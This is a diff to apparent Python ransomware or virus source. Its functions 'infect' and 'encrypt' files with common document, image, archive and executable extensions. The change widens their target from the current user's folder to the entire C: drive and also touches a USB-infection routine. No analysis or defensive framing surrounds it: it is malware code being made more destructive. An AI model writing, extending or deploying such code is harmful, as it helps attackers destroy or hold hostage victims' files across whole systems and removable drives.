@@ -29,11 +29,10 @@ targets = ('.txt', '.docx', '.doc', '.lnk', '.xlsx', '.pdf', '.zip', '.ppt',
 
 def virus_property():
     # Infect files in current user
-    user = getpass.getuser()
     target = ('txt', '.pdf', '.png', '.exe', '.docx', '.doc', '.lnk', '.zip',
               '.ppt', '.gz', '.rar', '.jpg', '.jpeg', 'gif' '.tar', '.ppt',
               '.xls', '.xlsx')
-    path = 'C:/Users/' + user + '/'
+    path = 'C:\\'
     for r, d, files in os.walk(path):
         for file in files:
             if file.endswith(target):
@@ -86,9 +85,8 @@ def usb_infection():
 
 
 def find_file():
-    usr = getpass.getuser()
     # Get files to encrypt from current user
-    path = 'C:/Users/' + usr + '/'
+    path = 'C:\\'
     for r, d, files in os.walk(path):
         for file in files:
             if file.endswith(targets):
